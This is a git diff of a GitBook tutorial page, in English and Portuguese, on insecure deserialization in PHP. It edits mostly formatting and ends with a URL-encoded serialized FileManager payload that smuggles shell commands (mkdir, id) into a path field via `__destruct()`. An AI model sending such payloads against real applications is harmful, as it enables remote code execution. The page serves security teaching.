@@ -2,16 +2,16 @@
 
 ## What is serialization?
 
-**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
+**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
 
-- Write complex data to inter-process memory, a file, or a database
-- Send complex data, for example, over a network, between different components of an application, or in an API call
+* Write complex data to inter-process memory, a file, or a database
+* Send complex data, for example, over a network, between different components of an application, or in an API call
 
 Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
 
 object-1-image.jpg
 
-Essa forma de compactação pode ser em dois  tipos: binário ou human-readable. Os Binários são: Java serialization, python pickle, C++  Object Representationm,  etc. Os Human-Readable são:  JSON, XML, YAML, SOAP, PHP Serialization, etc.
+Essa forma de compactação pode ser em dois tipos: binário ou human-readable. Os Binários são: Java serialization, python pickle, C++ Object Representationm, etc. Os Human-Readable são: JSON, XML, YAML, SOAP, PHP Serialization, etc.
 
 Vamos ver um exemplo de como podemos serializar um objeto
 
@@ -49,14 +49,15 @@ O:3:"Car":3:{s:5:"color";s:5:"White";s:5:"model";s:4:"Golf";s:5:"wheel";i:4;}
 
 TYPE:QTY:VALUE
 
-
 ## PHP
 
-Nos exemplos a seguir, podemos ver que é possível explorar a insecure deserialization por causa do magic method `__destruct()`
-img1
-img2
-img3
+Nos exemplos a seguir, podemos ver que é possível explorar a insecure deserialization por causa do magic method `__destruct()`&#x20;
 
+<figure><img src="../.gitbook/assets/php-1.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/php-2.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/php-3.png" alt=""><figcaption></figcaption></figure>
 
 Com isso, podemos montar um array com um objeto serializado da classe FileManager, explorando the magic method `__destruct()` do PHP.
 
@@ -94,4 +95,3 @@ O payload final ficará assim:
 a%3A2%3A%7Bs%3A7%3A%22payload%22%3BO%3A11%3A%22FileManager%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A52%3A%22%2Ftmp%2Ftest%2F%3Bmkdir%20%2Ftmp%2Frce%2F%3B%20id%3E%2Ftmp%2Frce%2Fid.txt%3B%20echo%22%3B%7D%7D
 ```
 {% endcode %}
-
